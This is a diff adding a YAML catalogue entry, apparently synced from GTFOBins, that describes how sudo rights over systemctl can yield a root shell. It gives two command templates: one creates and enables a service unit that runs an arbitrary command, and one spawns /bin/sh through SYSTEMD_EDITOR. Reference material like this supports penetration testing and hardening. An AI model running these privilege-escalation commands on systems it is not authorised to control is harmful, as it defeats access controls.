@@ -1,0 +1,43 @@
+id: gtfobins/systemctl/shell/sudo
+type: binary
+platform: linux
+name: systemctl
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''[Service]
+
+    Type=oneshot
+
+    ExecStart=/path/to/command
+
+    [Install]
+
+    WantedBy=multi-user.target'' >/path/to/temp-file.service
+
+    systemctl link /path/to/temp-file.service
+
+    systemctl enable --now /path/to/temp-file.service'
+  comment: It might happen that the service is not started with `--now`, in such cases it might be necessary
+    to manually start it.
+- template: 'echo /bin/sh >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target'
+references:
+- https://gtfobins.github.io/gtfobins/systemctl/
+tags:
+- linux
+- unix
+- gtfobins
